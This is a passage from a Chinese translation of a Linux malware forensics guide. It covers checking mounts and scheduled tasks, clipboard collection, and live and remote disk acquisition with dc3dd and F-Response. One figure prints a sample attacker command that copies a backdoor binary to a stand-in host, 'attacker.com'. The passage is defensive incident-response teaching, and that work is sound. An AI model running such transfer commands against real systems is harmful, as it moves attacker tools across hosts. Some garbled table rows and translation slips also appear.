
| `/dev/fd0` | `/media/floppy` | ext2 | user,nauto | 0 | 0 |

| `/dev/hdc` | `/media/cdrom` | iso960 user,nauto,ro | 0 | |

| none | `/dev/pts` | gid=t,mode=620 | 0 | |

| none | `/dev/proc` | `/home` | defaults | 0 | 0 |

| `server13:/home/accts/accts` | | nfs | | |

| bg,hard,int,rsize=8192,wsize=8192 | | | | |

| `server13:/var/pool/mail` | `/var/pool/mail` | nfs | | |

> 图 1.52—通过通过路径为 `/etc/fstab` 的目录列出的系统挂载共享列表

- 相反，恶意软件可以被放置在通过 Samba、NFS 或服务在网络上共享的系统中。由 NFS 服务导出的共享配置在 `"/etc/exports"` 文件中。

Samba 配置文件默认位于 `"/etc/samba/smb.conf"`，显示了任何导出的共享。应与系统管理员一起审查共享和挂载驱动器，以确定是否存在异常条目。

## 确定计划任务

- 恶意软件可能被安排定期重启，以便在重启后在受感染系统中持久化。

- Linux 上的计划任务使用 `at` 命令或 `crontabs` 配置。

- 运行 `at` 命令将显示计划进程，相关的队列通常位于 `/var/spool/cron/atjobs` 和 `/var/spool/cron/atspell` 目录。

- 检查系统上的 `crontab` 文件也将揭示计划任务。通常情况下，Linux 系统有一个系统 crontab 文件（例如 `/etc/crontab`），某些系统具有每日、每小时、每周和每月配置（例如 `/etc/cron.daily`、`/etc/cron.hourly`、`/etc/cron.weekly` 和 `/etc/cron.monthly`）。

- 此外，可以使用用户账户创建 `crontabs`。使用特定用户账户计划的任务作业队列可以在 `/var/spool/cron/crontabs` 下的用户账户子目录中找到。

## 收集剪贴板内容

- 如果潜在受感染系统的感染媒介未知，剪贴板内容可能提供有关攻击性质的线索，特别是当攻击者是“内部人员”并复制了部分文本粘贴到工具或攻击字符串中时。

- 剪贴板内容可能包含：

- 域名

- IP 地址

- 电子邮件地址

- 用户名和密码

- 主机名

- 即时通讯器聊天或电子邮件内容

- 攻击命令

- 其他识别攻击手段或目的的珍贵人工制品

使用 `xclip` 检查目标对象的剪贴板内容，它会收集并显示剪贴板内容，如图 1.53 所示。在此示例中，剪贴板包含一个安全拷贝命令，用于将后门客户端二进制文件（revclient-666）传输到攻击者控制的主机。

```
#### /media/cdrom/Linux-IR/xclip -o
scp /home/victimuser/evils/revclient-666 baduser@attacker.com:
```

图 1.53–使用 `xclip -o` 命令收集的剪贴板内容

## 从现场 Linux 系统收集非易失性数据

- 历史上，数字调查人员被指示创建硬盘的取证副本，并被反对从现场系统收集文件。然而，从可能涉及的系统中获取所有数据并不总是可行的。特别是在涉及大量系统的事件响应情况下，从每个系统获取特定文件以确定哪些受影响可能是有效的。从现场系统选择性获取文件而不是创建取证副本的决定必须谨慎做出，因为任何操作都会改变现场。

## 现场 Linux 系统存储媒介的取证复制

- 在某些情况下（例如高可用系统），关闭系统进行取证复制可能是不可行的。

- 对于需要全面分析的系统，在目标系统的取证副本上执行取证任务。

- 如果无法关闭系统，请在运行时创建取证副本。

- 图 1.54 显示的命令保存到磁盘介质的文件，并带有用于完整性的 MD5 哈希和记录收集过程的审计日志。

```
#### /media/cdrom/Linux-IR/dc3dd if=/dev/hda
of=/media/IR/victim1.dd log=/media/IR/audit/victim1.log
hash=md5 hlog=/media/IR/audit/victim1.md5
```

图 1.54-使用 `dc3dd` 命令对受感染系统的硬盘进行取证复制

- 在获取取证副本时，验证是否获取了整个硬盘。

- 一种方法是将 `fdisk -l --sectors` 显示的扇区数（加粗图 1.55 中）与取证副本中获取的数量进行比较。请注意，某些 Linux 上的 `fdisk` 使用不同的命令语法，可以使用 `fdisk -lu` 命令显示扇区数。

- 然而，在某些情况下，`fdisk` 无法检测所有扇区，例如当存在主机保护区域 (`HPA`) 或设备配置覆盖 (`DCO`) 时。

```
#### /media/cdrom/Linux-IR/fdisk -l -u=sectors
Disk /dev/hda: 80.0 GB, 8002636186 bytes
16 heads, 63 sectors/track, 155061 cylinders, total 156301488 sectors
Units = sectors of * 512 = 512 bytes

| Device | Start | End | Blocks | Id | System |
| :--- | :--- | :--- | :--- | :--- | :--- |
| /dev/hda * | 63 | 52429103 | 26214520+ | 7 | HPFS/NTFS |
| /dev/hdb2 | 52429104 | 83891428 | 15731163 | 83 | Linux |

Partition 2 does not end on cylinder boundary.
/dev/hda3 | 83891430 | 104371343 | 10239957 | 7 | HPFS/NTFS
```

图 1.5—使用 `fdisk -l -u=sectors` 在存绪系统上列出分区

- 因此，在获取存绪系统的取证副本时，需要获取其配置（例如使用 `dmesg`、来自 The SleuthKit 的 `disk_stat`，25 或 `hdparm`^26）、硬盘以及任何关于扇区数量的在线文档。

- 请注意，保留 `fdisk` 显示的各个独立分区可能有助于分析，但如果需要，也可以从完整磁盘中提取这些分区。27

- 较新版本的 The SleuthKit 允许用户在完整磁盘镜像中选择特定的分区。

# 在存绪 Linux 系统上对存储媒体进行远程获取

> 可以使用 F-Response 从目标系统远程获取硬盘硬盘。

F-Response 是一种事件响应框架，它实现了互联网小型计算机系统接口（被称为“iSCSI”）228 发起程序，用于为网络计算机的完整物理磁盘（磁盘）提供只读访问。29

- F-Response 有四个版本（Field Kit、Consultant、Enterprise 和 TACTICAL），它们在部署方法上有所不同，但可以将远程系统驱动器作为本地挂载驱动器进行访问。

25 关于 The SleuthKit 的更多信息，请访问 http://www.sleuthkit.org/

26 关于 `hdparm` 的更多信息，请访问 http://sourceforge.net/projects/hdparm/

27 Carrier, B., “Detecting Host Protected Areas (HPA) in Linux,” The Sleuth Kit Informer, Issue #17, November 15, 2004, available at http://www.sleuthkit.org/informer/sleuthkit-informer-17.html.

28 http://www.faqs.org/rfcs/rfc3720.html.

# 第 1 章 恶意软件事件响应

- F-Response 灵活灵活且“与供应商无关”，这意味着当连接到目标系统时，可以使用任何工具来获取目标系统硬盘和物理内存（目前仅支持 Windows）的镜像。

- F-Response Field Kit 和 TACTICAL 通常用于存绪响应，特别是在目标系统位于第三方地点，且在事件发生前未部署 F-Response Consultant 发起程序或 Enterprise 版的情景。

- F-Response Field Kit 需要单个 USB FOB 密狗和 Field Linux (`f-response-fk.lin`)，两者都在目标系统上启动。

- 相反，允许数字调查人员利用 F-Response 结果的取证系统只需安装并调用 iSCSI 发起程序。Microsoft iSCSI 发起程序可以安装在 Windows 取证系统上，而 Open-iSCSI 可以安装在 Linux 取证系统上。

- F-Response TACTICAL 使用可区分的配对 FOB 部署并带有自动-iSCSI 信标，将在下节和附录框中进行讨论。

- 要使用 F-Response Field Kit 访问远程目标系统，请将 USB FOB 密狗连接到目标系统并从命令行执行 F-Response，如图 1.56 所示。`u` 和 `-p` 选项分别指定会话的用户名和密码。

```
root@home:/victim-system/Desktop# /f-response-fk-lin -u malwarelab -p password123456
-Response Field Kit (Linux Edition) Version 4.00.02
-Response Disk: /dev/sda (41943040 sectors, 512 sector size)
20480 MB blocked storage on F-Response Disk:sda
```

图 1.56—在目标 Linux 系统上执行 F-Response Field Kit

- 从目标系统上调用 F-Response Field Kit 后，从你的取证系统识别并连接到该系统。在本节中，我们将讨论如何从 Linux 和 Windows 取证系统进行获取，因为许多数字调查人员选择使用他们的 Windows 取证系统来执行此任务。

30 关于 Microsoft iSCSI 发起程序的更多信息，请访问 http://technet.microsoft.com/en-us/library/dd878522%28WS.10%29.aspx;; http://www.microsoft.com/download/en/details.aspx?id=18986.

31 关于 Open-iSCSI 的更多信息，请访问 http://www.open-iscsi.org。

## 从 Linux 取证系统获取

使用 F-Response Field Kit 连接到 Windows 取证系统是常见的做法，通过图形化 iSCSI 发起程序实现。

- 在你的本地取证系统上，调用 iSCSI 发起程序，选择“Discovery”选项卡，并将目标系统添加目标，如图 1.59 所示。

32 关于 Open-iSCSI 的安装和配置（特别是配合 F-Response 使用），F-Response 的人员在他们的博客上提供了指导：http://www.f-response.com/index.php?option=com_content&view=article&id=51%3AAccessing-f-response-using-linux&catid=%3Alog-posts&item=55.

33 关于 F-Response 的更多平台要求和培训视频，请访问 http://www.f-response.com/index.php?option=com_content&view=article&id=165&itemid=83.

# 第 1 章 恶意软件事件响应

- 使用 F-Response 本地挂载远程系统硬盘为数字调查人员提供了取证获取整个硬盘或逻辑选择数据的灵活性。

## 调查考量

- 存储于 `/dev` 目录和 `/proc` 文件系统中的易失性信息无法通过 F-Response 访问。回想 `/dev` 和 `/proc` 是本地 Linux 机器上的动态内存存储，这些目录包含的信息仅是指向内存结构的符号链接。因此，通过 F-Response 挂载目标系统的物理磁盘无法让数字调查人员访问这些结构。

## Linux 系统恶意软件取证实战指南

- 选择“Advanced（高级）”选项，并提供在目标系统上 F-Response 远程配置时相同的用户名和密码据（图 1.60）。

![](img/aa19fd7b1fc75dc422144821b9c6657c_84_0.png)

图 1.60—通过 iSCSI 启动器进行身份验证以获取目标系统

- 验证通过后，目标系统将显示为一个目标设备。从目标列表中选择目标硬盘（需要重新身份验证）并连接到目标系统；连接状态将显示在目标列表中（图 1.61）。

![](img/aa19fd7b1fc75dc422144821b9c6657c_84_1.png)

图 1.61—连接到目标系统

# 第 1 章 恶意软件事件响应

- 一旦通过 F-Response 连接到目标系统，目标系统的硬盘可以被识别为连接到取证员系统的物理设备——但不会表现为已挂载卷。这是因为 ext3 和 ext4 文件系统是大多数 Linux 发行版的默认系统，Windows 无法原生读取.³34

- 要确认目标系统的物理磁盘为已连接设备，请在取证员系统的“磁盘管理”加载项中识别该磁盘.³35如图 1.62 所示，目标系统驱动将显示为具有无法识别文件的物理磁盘。

![](img/aa19fd7b1fc75dc422144821b9c6657c_85_0.png)

图 1.62—在“磁盘管理”加载项中识别目标系统驱动

尽管目标系统的物理磁盘无法挂载和访问，但可以对其进行取证获取。要获取磁盘镜像，只需在取证员系统上使用选择的取证获取工具，并将目标系统驱动作为镜像源。如图 1.63 所示，使用 FTK Imager 识别并选择了所定的 Linux 系统驱动作为源驱动.³36

![](img/aa19fd7b1fc75dc422144821b9c6657c_85_1.png)

图 1.63—使用 FTK Imager 获取目标系统驱动

> ³⁴ Ext2/ext3 文件系统可以使用多种工具在 Windows 上进行读取，例如开源工具 ext2read，http://sourceforge.net/projects/ext2read。

> ³⁵ “磁盘管理”加载项位于 Windows XP、Windows 2003 和 Windows Vista 的“管理工具>计算机管理>存储>磁盘管理”中。在 Windows 7 中，可以通过“控制面板>系统和安全>管理工具>计算机管理”然后选择“存储 磁盘管理”，或右键点击“我的电脑——管理”。

> ³⁶ 有关更多关于 FTK Imager 的信息，请访问 https://ad-pdf.s3.amazonaws.com/FTKImager_UserGuide.pdf；以及 http://accessdata.com/support/downloads。

## Linux 系统恶意软件取证实战指南

## F-Response 战术版 (TACTICAL)

- F-Response TACTICAL 是一种用于现场响应的精简解决方案，它使用独特的双加密/存储设备解决方案，能够让数字调查员在对目标网络拓扑了解有限的情况下，快速且无缝地进行远程取证获取。

- 双加密狗——一个用于目标系统，一个用于取证员系统（如图 1.64 所示）——使用 iSCSI “自动信标”，通过对工作将远程目标系统连接到数字调查员的检查系统。

![](img/aa19fd7b1fc75dc422144821b9c6657c_86_0.png)

图 1.64—F-Response TACTICAL“目标”和“取证员”加密狗

- 一旦调用，TACTICAL Subject 会在默认的 iSCSI 端口 (`3260`) 上作为可用的 iSCSI 目标发出信标。相反，一旦执行 TACTICAL Examiner，将利用 Open-iSCSI 套件（需要预先安装）来实现与远程 TACTICAL 目标系统的连接。

- TACTICAL 直接从加密狗运行，目标系统上不需要任何安装。与 F-Response 的其他版本一样，除了 Linux 系统外，TACTICAL 还可以获取 Windows 和 Macintosh OS X 系统。

- 当 TACTICAL 加密狗插入目标系统时，它包含“TACTICAL Subject”目录，其中包含适用于 Windows、Linux 和 Macintosh OS X 系统的执行文件。

# 第 1 章 恶意软件事件响应

- - 如图 1.65 所示，执行 Linux 可执行文件 (`f-response-tacsub-lin`)，将调用 F-Response，目标系统作为 iSCSI 目标发出信标，并对整个磁盘具有只读访问权限。

```
root@ubuntu:/media/SUBJECT/TACTICAL Subject# ./f-response-tacsub-lin
F-Response TACTICAL (Linux Edition) Version 4.00.02
F-Response Disk: /dev/sdx (41943040 sectors, 512 sector size)
20480 MB write blocked on F-Response Disk
F-Response Disk: /dev/sdb (3947520 sectors, 512 sector size)
1927 MB write storage on F-Response Disk
```

图 1.65—在目标系统上执行 F-Response
